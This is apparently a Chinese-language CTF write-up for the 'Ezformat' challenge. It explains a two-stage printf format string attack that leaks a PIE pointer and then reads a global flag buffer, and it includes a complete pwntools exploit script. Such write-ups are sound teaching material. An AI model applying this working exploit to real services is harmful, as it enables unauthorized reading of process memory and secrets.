# Ezformat

## 题目简述

程序启动时把 `/flag` 读入 PIE 映像中的全局数组 `flag`，随后循环把最多 `0x20` 字节输入直接作为 `printf` 格式串。先用格式化字符串泄露 PIE 内的 `_start` 地址，再把运行时 `flag` 地址放到栈上并用 `%s` 读取即可。

## 解题过程

静态符号和反汇编给出：

```text
_start offset = 0x1140
flag offset   = 0x40c0
delta         = 0x40c0 - 0x1140 = 0x2f80
```

第一次输入中，`%9$p` 会泄露栈上保存的 `_start` 返回相关指针，因此：

$$
\text{flag\_addr}=\text{leaked\_start}+0x2f80
$$

第二次调用 `printf(user_buffer)` 时，把目标地址放在格式串后的第 7 个位置，并使用 `%7$s` 解引用。格式串自身补到 8 字节，使后面的 `p64(flag_addr)` 正好落到对应参数槽。

```python
from pwn import context, p64, remote

context(arch="amd64", os="linux")
io = remote("HOST", PORT)

# 1. 泄露 PIE 中的 _start
leak_payload = b"A" * 8 + b"%9$pEND\x00"
io.sendafter(b"Say something:", leak_payload)
io.recvuntil(b"A" * 8)
start_address = int(io.recvuntil(b"END", drop=True), 16)

flag_address = start_address + 0x2F80
print(f"_start = {start_address:#x}")
print(f"flag   = {flag_address:#x}")

# 2. 第 7 个参数指向全局 flag
read_payload = b"%7$sEND\x00" + p64(flag_address)
assert len(read_payload) <= 0x20
io.sendafter(b"Say something:", read_payload)

flag = io.recvuntil(b"END", drop=True)
print(flag.decode(errors="replace"))
io.close()
```

仓库只提供运行程序和 libc，实际比赛 `/flag` 内容不在附件中；脚本最后打印的远程响应就是当前实例 flag，不能从旧地址或本地二进制中臆造。

## 方法总结

本题是两阶段格式化字符串读取：先泄露 PIE 指针建立运行时基址，再利用位置参数把任意地址当作 `%s` 指针。写 WP 时应同时记录静态偏移、泄露值的语义和参数槽布局，而不是只保留某次运行的绝对地址。
